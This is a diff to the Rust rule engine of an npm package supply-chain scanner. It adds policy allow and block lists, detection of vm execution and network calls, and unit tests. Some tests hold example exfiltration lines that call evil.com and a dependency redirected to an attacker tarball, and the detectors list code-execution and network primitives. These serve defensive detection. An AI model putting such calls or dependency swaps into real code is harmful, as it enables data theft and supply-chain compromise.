@@ -1,38 +1,94 @@
 use crate::diff::{Delta, FileKind};
+use crate::policy::Policy;
 use crate::verdict::{DiffSummary, Finding, Verdict, VerdictBand};
 
+#[allow(dead_code)]
 pub fn evaluate(
     name: &str,
     integrity: &str,
     delta: &Delta,
     is_unreviewed_baseline: bool,
 ) -> Verdict {
+    evaluate_with_policy(
+        name,
+        integrity,
+        delta,
+        is_unreviewed_baseline,
+        &Policy::default(),
+    )
+}
+
+pub fn evaluate_with_policy(
+    name: &str,
+    integrity: &str,
+    delta: &Delta,
+    is_unreviewed_baseline: bool,
+    policy: &Policy,
+) -> Verdict {
     let mut findings = Vec::new();
+
+    // P01: Check if package is explicitly blocked by policy
+    if policy.is_package_blocked(name) {
+        findings.push(Finding {
+            rule_id: "P01_PACKAGE_BLOCKED".into(),
+            severity: VerdictBand::Block,
+            title: format!("Package `{name}` is blocked by policy"),
+            description: "The package matches an active blocklist rule in blueline.toml.".into(),
+        });
+    }
 
     // R01: Lifecycle scripts
     for script in &delta.new_lifecycle_scripts {
-        findings.push(Finding {
-            rule_id: "R01_LIFECYCLE_SCRIPT_ADDED".into(),
-            severity: VerdictBand::Block,
-            title: format!("New install-time lifecycle script: `{script}`"),
-            description: format!(
-                "The package added `{script}` to package.json scripts which executes automatically on install."
-            ),
-        });
+        if policy.is_script_allowed(name, script) {
+            findings.push(Finding {
+                rule_id: "P02_LIFECYCLE_SCRIPT_ALLOWED".into(),
+                severity: VerdictBand::Low,
+                title: format!("Allowed lifecycle script: `{script}`"),
+                description: format!(
+                    "The lifecycle script `{script}` is explicitly allowed by policy allowlist."
+                ),
+            });
+        } else {
+            findings.push(Finding {
+                rule_id: "R01_LIFECYCLE_SCRIPT_ADDED".into(),
+                severity: if policy.policy.block_unreviewed_scripts {
+                    VerdictBand::Block
+                } else {
+                    VerdictBand::High
+                },
+                title: format!("New install-time lifecycle script: `{script}`"),
+                description: format!(
+                    "The package added `{script}` to package.json scripts which executes automatically on install."
+                ),
+            });
+        }
     }
 
     for script in &delta.modified_lifecycle_scripts {
-        findings.push(Finding {
-            rule_id: "R01_LIFECYCLE_SCRIPT_MODIFIED".into(),
-            severity: VerdictBand::High,
-            title: format!("Modified lifecycle script: `{script}`"),
-            description: format!(
-                "The command for lifecycle script `{script}` was modified between releases."
-            ),
-        });
+        if policy.is_script_allowed(name, script) {
+            findings.push(Finding {
+                rule_id: "P02_LIFECYCLE_SCRIPT_ALLOWED".into(),
+                severity: VerdictBand::Low,
+                title: format!("Allowed modified lifecycle script: `{script}`"),
+                description: format!(
+                    "The modified lifecycle script `{script}` is explicitly allowed by policy allowlist."
+                ),
+            });
+        } else {
+            findings.push(Finding {
+                rule_id: "R01_LIFECYCLE_SCRIPT_MODIFIED".into(),
+                severity: VerdictBand::High,
+                title: format!("Modified lifecycle script: `{script}`"),
+                description: format!(
+                    "The command for lifecycle script `{script}` was modified between releases."
+                ),
+            });
+        }
     }
 
     // Native build trigger: binding.gyp in root triggers node-gyp rebuild on install
+    let binding_allowed =
+        policy.is_script_allowed(name, "binding.gyp") || policy.is_script_allowed(name, "node-gyp");
     if delta.binding_gyp_added
         || delta
             .files_added
@@ -40,9 +96,21 @@ pub fn evaluate(
             .any(|f| f.relative_path == "binding.gyp")
     {
         findings.push(Finding {
-            rule_id: "R01_BINDING_GYP_ADDED".into(),
-            severity: VerdictBand::Block,
-            title: "Automated native build trigger: `binding.gyp`".into(),
+            rule_id: if binding_allowed {
+                "P02_BINDING_GYP_ALLOWED".into()
+            } else {
+                "R01_BINDING_GYP_ADDED".into()
+            },
+            severity: if binding_allowed {
+                VerdictBand::Low
+            } else {
+                VerdictBand::Block
+            },
+            title: if binding_allowed {
+                "Allowed native build trigger: `binding.gyp`".into()
+            } else {
+                "Automated native build trigger: `binding.gyp`".into()
+            },
             description: "The package added `binding.gyp` in root which triggers `node-gyp rebuild` automatically on install.".into(),
         });
     } else if delta
@@ -51,9 +119,21 @@ pub fn evaluate(
         .any(|f| f.relative_path == "binding.gyp")
     {
         findings.push(Finding {
-            rule_id: "R01_BINDING_GYP_MODIFIED".into(),
-            severity: VerdictBand::High,
-            title: "Modified native build file: `binding.gyp`".into(),
+            rule_id: if binding_allowed {
+                "P02_BINDING_GYP_ALLOWED".into()
+            } else {
+                "R01_BINDING_GYP_MODIFIED".into()
+            },
+            severity: if binding_allowed {
+                VerdictBand::Low
+            } else {
+                VerdictBand::High
+            },
+            title: if binding_allowed {
+                "Allowed native build file: `binding.gyp`".into()
+            } else {
+                "Modified native build file: `binding.gyp`".into()
+            },
             description: "The `binding.gyp` native build configuration was modified between releases.".into(),
         });
     }
@@ -118,6 +198,17 @@ pub fn evaluate(
         }
     }
 
+    for bin in &delta.modified_binaries {
+        findings.push(Finding {
+            rule_id: "R02_BINARY_BLOB_MODIFIED".into(),
+            severity: VerdictBand::High,
+            title: format!("Binary or opaque blob modified: `{bin}`"),
+            description: format!(
+                "Pre-existing binary file `{bin}` was modified or replaced between releases."
+            ),
+        });
+    }
+
     // R03: Suspicious code in text diffs (eval, child_process, base64 payload)
     for file in delta.files_added.iter().chain(delta.files_modified.iter()) {
         if file.kind == FileKind::Text
@@ -153,6 +244,19 @@ pub fn evaluate(
             ),
             description: format!("Added dependencies: {deps_str}"),
         });
+    }
+
+    for (dep, old_ver, new_ver) in &delta.modified_dependencies {
+        if is_non_semver_url(new_ver) {
+            findings.push(Finding {
+                rule_id: "R04_DEPENDENCY_MODIFIED".into(),
+                severity: VerdictBand::High,
+                title: format!("Dependency `{dep}` changed to non-semver URL"),
+                description: format!(
+                    "Dependency `{dep}` version modified from `{old_ver}` to suspicious URL `{new_ver}`."
+                ),
+            });
+        }
     }
 
     // R05: Large diff anomaly on patch or non-standard semver
@@ -248,9 +352,13 @@ pub fn evaluate(
 
     let capped_score = score.min(100);
 
-    // Escalate to Block if accumulated risk score reaches 80+
-    if capped_score >= 80 {
+    // Escalate according to policy thresholds if accumulated score exceeds them
+    if capped_score >= policy.thresholds.block_score {
         band = VerdictBand::Block;
+    } else if capped_score > policy.thresholds.max_medium_score && band < VerdictBand::High {
+        band = VerdictBand::High;
+    } else if capped_score > policy.thresholds.max_low_score && band < VerdictBand::Medium {
+        band = VerdictBand::Medium;
     }
 
     Verdict {
@@ -288,12 +396,14 @@ fn is_non_semver_url(v: &str) -> bool {
 fn scan_diff_for_suspicious_patterns(path: &str, diff: &str, findings: &mut Vec<Finding>) {
     let mut flagged_eval = false;
     let mut flagged_child_proc = false;
+    let mut flagged_vm = false;
+    let mut flagged_network = false;
     let mut flagged_base64_exec = false;
     let mut flagged_high_entropy = false;
 
     let mut added_lines = Vec::new();
     for line in diff.lines() {
-        if line.starts_with('+') && !line.starts_with("+++") {
+        if line.starts_with('+') && !line.starts_with("+++ ") && !line.starts_with("+++ b/") {
             added_lines.push(&line[1..]);
         }
     }
@@ -318,6 +428,28 @@ fn scan_diff_for_suspicious_patterns(path: &str, diff: &str, findings: &mut Vec<
             severity: VerdictBand::High,
             title: format!("Process execution primitive in `{path}`"),
             description: format!("Diff introduced child_process execution calls in `{path}`."),
+        });
+    }
+
+    if is_vm_invocation(&combined_added) {
+        flagged_vm = true;
+        findings.push(Finding {
+            rule_id: "R03_VM_EXECUTION".into(),
+            severity: VerdictBand::High,
+            title: format!("Dynamic VM code execution in `{path}`"),
+            description: format!("Diff introduced Node.js `vm` module execution in `{path}`."),
+        });
+    }
+
+    if is_network_invocation(&combined_added) {
+        flagged_network = true;
+        findings.push(Finding {
+            rule_id: "R03_NETWORK_PRIMITIVE".into(),
+            severity: VerdictBand::Medium,
+            title: format!("Network request primitive in `{path}`"),
+            description: format!(
+                "Diff introduced outbound network communication calls in `{path}`."
+            ),
         });
     }
 
@@ -349,6 +481,28 @@ fn scan_diff_for_suspicious_patterns(path: &str, diff: &str, findings: &mut Vec<
                 severity: VerdictBand::High,
                 title: format!("Process execution primitive in `{path}`"),
                 description: format!("Diff introduced child_process execution calls in `{path}`."),
+            });
+        }
+
+        if !flagged_vm && is_vm_invocation(line) {
+            flagged_vm = true;
+            findings.push(Finding {
+                rule_id: "R03_VM_EXECUTION".into(),
+                severity: VerdictBand::High,
+                title: format!("Dynamic VM code execution in `{path}`"),
+                description: format!("Diff introduced Node.js `vm` module execution in `{path}`."),
+            });
+        }
+
+        if !flagged_network && is_network_invocation(line) {
+            flagged_network = true;
+            findings.push(Finding {
+                rule_id: "R03_NETWORK_PRIMITIVE".into(),
+                severity: VerdictBand::Medium,
+                title: format!("Network request primitive in `{path}`"),
+                description: format!(
+                    "Diff introduced outbound network communication calls in `{path}`."
+                ),
             });
         }
 
@@ -388,8 +542,9 @@ fn unescape_js(s: &str) -> String {
                     for _ in 0..2 {
                         if let Some(&h) = chars.peek()
                             && h.is_ascii_hexdigit()
+                            && let Some(ch) = chars.next()
                         {
-                            hex.push(chars.next().unwrap());
+                            hex.push(ch);
                         }
                     }
                     if hex.len() == 2
@@ -412,8 +567,10 @@ fn unescape_js(s: &str) -> String {
                                 chars.next();
                                 break;
                             }
-                            if h.is_ascii_hexdigit() {
-                                hex.push(chars.next().unwrap());
+                            if h.is_ascii_hexdigit()
+                                && let Some(ch) = chars.next()
+                            {
+                                hex.push(ch);
                             } else {
                                 break;
                             }
@@ -434,8 +591,9 @@ fn unescape_js(s: &str) -> String {
                         for _ in 0..4 {
                             if let Some(&h) = chars.peek()
                                 && h.is_ascii_hexdigit()
+                                && let Some(ch) = chars.next()
                             {
-                                hex.push(chars.next().unwrap());
+                                hex.push(ch);
                             }
                         }
                         if hex.len() == 4
@@ -453,12 +611,15 @@ fn unescape_js(s: &str) -> String {
                 Some(&d) if ('0'..='7').contains(&d) => {
                     // Octal escape sequence (e.g. \145 \166 \141 \154)
                     let mut oct = String::new();
-                    oct.push(chars.next().unwrap());
+                    if let Some(first) = chars.next() {
+                        oct.push(first);
+                    }
                     for _ in 0..2 {
                         if let Some(&o) = chars.peek()
                             && ('0'..='7').contains(&o)
+                            && let Some(ch) = chars.next()
                         {
-                            oct.push(chars.next().unwrap());
+                            oct.push(ch);
                         } else {
                             break;
                         }
@@ -484,7 +645,31 @@ fn unescape_js(s: &str) -> String {
 fn strip_comments_and_whitespace(s: &str) -> String {
     let mut out = String::with_capacity(s.len());
     let mut chars = s.chars().peekable();
+    let mut in_quote: Option<char> = None;
     while let Some(c) = chars.next() {
+        if let Some(q) = in_quote {
+            if c == '\\' {
+                out.push(c);
+                if let Some(escaped) = chars.next() {
+                    out.push(escaped);
+                }
+                continue;
+            }
+            if c == q {
+                in_quote = None;
+            }
+            if !c.is_whitespace() {
+                out.push(c);
+            }
+            continue;
+        }
+
+        if c == '"' || c == '\'' || c == '`' {
+            in_quote = Some(c);
+            out.push(c);
+            continue;
+        }
+
         if c == '/' {
             if let Some(&'*') = chars.peek() {
                 chars.next();
@@ -510,6 +695,33 @@ fn strip_comments_and_whitespace(s: &str) -> String {
         }
     }
     out
+}
+
+fn is_vm_invocation(s: &str) -> bool {
+    let unescaped = unescape_js(s);
+    let s_clean = strip_comments_and_whitespace(&unescaped);
+    s_clean.contains("vm.runInThisContext")
+        || s_clean.contains("vm.runInNewContext")
+        || s_clean.contains("vm.runInContext")
+        || s_clean.contains("vm.Script(")
+        || s_clean.contains("vm.createScript(")
+        || s_clean.contains("runInThisContext(")
+        || s_clean.contains("runInNewContext(")
+}
+
+fn is_network_invocation(s: &str) -> bool {
+    let unescaped = unescape_js(s);
+    let s_clean = strip_comments_and_whitespace(&unescaped);
+    s_clean.contains("fetch(")
+        || s_clean.contains("http.request(")
+        || s_clean.contains("http.get(")
+        || s_clean.contains("https.request(")
+        || s_clean.contains("https.get(")
+        || s_clean.contains("net.connect(")
+        || s_clean.contains("tls.connect(")
+        || s_clean.contains("dgram.createSocket(")
+        || s_clean.contains("new WebSocket(")
+        || s_clean.contains("newWebSocket(")
 }
 
 fn is_eval_invocation(s: &str) -> bool {
@@ -636,9 +848,11 @@ mod tests {
             total_lines_deleted: 0,
             new_executables: vec![],
             new_binaries: vec![],
+            modified_binaries: vec![],
             new_lifecycle_scripts: vec!["postinstall".into()],
             modified_lifecycle_scripts: vec![],
             new_dependencies: vec![],
+            modified_dependencies: vec![],
             removed_dependencies: vec![],
             binding_gyp_added: false,
         };
@@ -673,9 +887,11 @@ mod tests {
             total_lines_deleted: 0,
             new_executables: vec!["payload.node".into()],
             new_binaries: vec!["payload.node".into()],
+            modified_binaries: vec![],
             new_lifecycle_scripts: vec![],
             modified_lifecycle_scripts: vec![],
             new_dependencies: vec![],
+            modified_dependencies: vec![],
             removed_dependencies: vec![],
             binding_gyp_added: false,
         };
@@ -715,9 +931,11 @@ mod tests {
             total_lines_deleted: 0,
             new_executables: vec![],
             new_binaries: vec!["large.bin".into()],
+            modified_binaries: vec![],
             new_lifecycle_scripts: vec![],
             modified_lifecycle_scripts: vec![],
             new_dependencies: vec![],
+            modified_dependencies: vec![],
             removed_dependencies: vec![],
             binding_gyp_added: false,
         };
@@ -751,9 +969,11 @@ mod tests {
             total_lines_deleted: 0,
             new_executables: vec![],
             new_binaries: vec![],
+            modified_binaries: vec![],
             new_lifecycle_scripts: vec![],
             modified_lifecycle_scripts: vec![],
             new_dependencies: vec![],
+            modified_dependencies: vec![],
             removed_dependencies: vec![],
             binding_gyp_added: true,
         };
@@ -796,9 +1016,11 @@ mod tests {
             total_lines_deleted: 0,
             new_executables: vec![],
             new_binaries: vec![],
+            modified_binaries: vec![],
             new_lifecycle_scripts: vec![],
             modified_lifecycle_scripts: vec![],
             new_dependencies: vec![("malicious-pkg".into(), "ssh://git@host/repo".into())],
+            modified_dependencies: vec![],
             removed_dependencies: vec![],
             binding_gyp_added: false,
         };
@@ -832,9 +1054,11 @@ mod tests {
             total_lines_deleted: 0,
             new_executables: vec![],
             new_binaries: vec![],
+            modified_binaries: vec![],
             new_lifecycle_scripts: vec![],
             modified_lifecycle_scripts: vec![],
             new_dependencies: vec![],
+            modified_dependencies: vec![],
             removed_dependencies: vec![],
             binding_gyp_added: false,
         };
@@ -862,9 +1086,11 @@ mod tests {
             total_lines_deleted: 0,
             new_executables: vec![],
             new_binaries: vec![],
+            modified_binaries: vec![],
             new_lifecycle_scripts: vec![],
             modified_lifecycle_scripts: vec![],
             new_dependencies: vec![],
+            modified_dependencies: vec![],
             removed_dependencies: vec![],
             binding_gyp_added: false,
         };
@@ -886,6 +1112,100 @@ mod tests {
         assert!(is_eval_invocation("new/**/Function(payload)"));
         assert!(is_eval_invocation("eval`payload`"));
         assert!(is_eval_invocation("Function('return this')()"));
+    }
+
+    #[test]
+    fn detects_eval_after_inline_url() {
+        assert!(is_eval_invocation(
+            r#"const url = "http://evil.com"; eval(payload);"#
+        ));
+        assert!(is_eval_invocation(
+            r#"const url = 'https://evil.com'; eval(payload);"#
+        ));
+        assert!(is_eval_invocation(
+            "const url = `//comment-like`; eval(payload);"
+        ));
+    }
+
+    #[test]
+    fn detects_vm_and_network_primitives() {
+        assert!(is_vm_invocation("vm.runInThisContext(code)"));
+        assert!(is_vm_invocation("const script = new vm.Script(code)"));
+        assert!(is_network_invocation("fetch('https://evil.com/exfil')"));
+        assert!(is_network_invocation("http.request('http://evil.com', cb)"));
+    }
+
+    #[test]
+    fn detects_modified_binaries() {
+        let delta = Delta {
+            baseline_version: Some("1.0.0".into()),
+            target_version: "1.0.1".into(),
+            files_added: vec![],
+            files_removed: vec![],
+            files_modified: vec![FileChange {
+                relative_path: "binding.node".into(),
+                kind: FileKind::Binary,
+                lines_added: 0,
+                lines_deleted: 0,
+                is_executable: false,
+                unified_diff: None,
+            }],
+            total_lines_added: 0,
+            total_lines_deleted: 0,
+            new_executables: vec![],
+            new_binaries: vec![],
+            modified_binaries: vec!["binding.node".into()],
+            new_lifecycle_scripts: vec![],
+            modified_lifecycle_scripts: vec![],
+            new_dependencies: vec![],
+            modified_dependencies: vec![],
+            removed_dependencies: vec![],
+            binding_gyp_added: false,
+        };
+
+        let verdict = evaluate("test-pkg", "verified (sha512)", &delta, false);
+        assert_eq!(verdict.band, VerdictBand::High);
+        assert!(
+            verdict
+                .findings
+                .iter()
+                .any(|f| f.rule_id == "R02_BINARY_BLOB_MODIFIED")
+        );
+    }
+
+    #[test]
+    fn detects_modified_dependency_non_semver_url() {
+        let delta = Delta {
+            baseline_version: Some("1.0.0".into()),
+            target_version: "1.0.1".into(),
+            files_added: vec![],
+            files_removed: vec![],
+            files_modified: vec![],
+            total_lines_added: 0,
+            total_lines_deleted: 0,
+            new_executables: vec![],
+            new_binaries: vec![],
+            modified_binaries: vec![],
+            new_lifecycle_scripts: vec![],
+            modified_lifecycle_scripts: vec![],
+            new_dependencies: vec![],
+            modified_dependencies: vec![(
+                "cookie".into(),
+                "0.7.1".into(),
+                "https://evil.com/cookie.tgz".into(),
+            )],
+            removed_dependencies: vec![],
+            binding_gyp_added: false,
+        };
+
+        let verdict = evaluate("test-pkg", "verified (sha512)", &delta, false);
+        assert_eq!(verdict.band, VerdictBand::High);
+        assert!(
+            verdict
+                .findings
+                .iter()
+                .any(|f| f.rule_id == "R04_DEPENDENCY_MODIFIED")
+        );
     }
 
     #[test]
@@ -948,9 +1268,11 @@ mod tests {
                 "p4.exe".into(),
             ],
             new_binaries: vec![],
+            modified_binaries: vec![],
             new_lifecycle_scripts: vec![],
             modified_lifecycle_scripts: vec![],
             new_dependencies: vec![],
+            modified_dependencies: vec![],
             removed_dependencies: vec![],
             binding_gyp_added: false,
         };
@@ -958,5 +1280,82 @@ mod tests {
         let verdict = evaluate("test-pkg", "verified (sha512)", &delta, false);
         assert_eq!(verdict.risk_score, 100);
         assert_eq!(verdict.band, VerdictBand::Block);
+    }
+
+    #[test]
+    fn policy_blocks_blacklisted_package() {
+        let delta = Delta {
+            baseline_version: Some("1.0.0".into()),
+            target_version: "1.0.1".into(),
+            files_added: vec![],
+            files_removed: vec![],
+            files_modified: vec![],
+            total_lines_added: 0,
+            total_lines_deleted: 0,
+            new_executables: vec![],
+            new_binaries: vec![],
+            modified_binaries: vec![],
+            new_lifecycle_scripts: vec![],
+            modified_lifecycle_scripts: vec![],
+            new_dependencies: vec![],
+            modified_dependencies: vec![],
+            removed_dependencies: vec![],
+            binding_gyp_added: false,
+        };
+
+        let mut policy = Policy::default();
+        policy.blocklist.packages.push("blocked-*".into());
+
+        let verdict =
+            evaluate_with_policy("blocked-pkg", "verified (sha512)", &delta, false, &policy);
+        assert_eq!(verdict.band, VerdictBand::Block);
+        assert!(
+            verdict
+                .findings
+                .iter()
+                .any(|f| f.rule_id == "P01_PACKAGE_BLOCKED")
+        );
+    }
+
+    #[test]
+    fn policy_allows_whitelisted_lifecycle_script() {
+        let delta = Delta {
+            baseline_version: Some("1.0.0".into()),
+            target_version: "1.0.1".into(),
+            files_added: vec![],
+            files_removed: vec![],
+            files_modified: vec![],
+            total_lines_added: 0,
+            total_lines_deleted: 0,
+            new_executables: vec![],
+            new_binaries: vec![],
+            modified_binaries: vec![],
+            new_lifecycle_scripts: vec!["postinstall".into()],
+            modified_lifecycle_scripts: vec![],
+            new_dependencies: vec![],
+            modified_dependencies: vec![],
+            removed_dependencies: vec![],
+            binding_gyp_added: false,
+        };
+
+        let mut policy = Policy::default();
+        policy
+            .allowlist
+            .packages
+            .push(crate::policy::PackageAllowRule {
+                name: "esbuild".into(),
+                allowed_scripts: vec!["postinstall".into()],
+                max_risk: None,
+                integrity: None,
+            });
+
+        let verdict = evaluate_with_policy("esbuild", "verified (sha512)", &delta, false, &policy);
+        assert_eq!(verdict.band, VerdictBand::Low);
+        assert!(
+            verdict
+                .findings
+                .iter()
+                .any(|f| f.rule_id == "P02_LIFECYCLE_SCRIPT_ALLOWED")
+        );
     }
 }
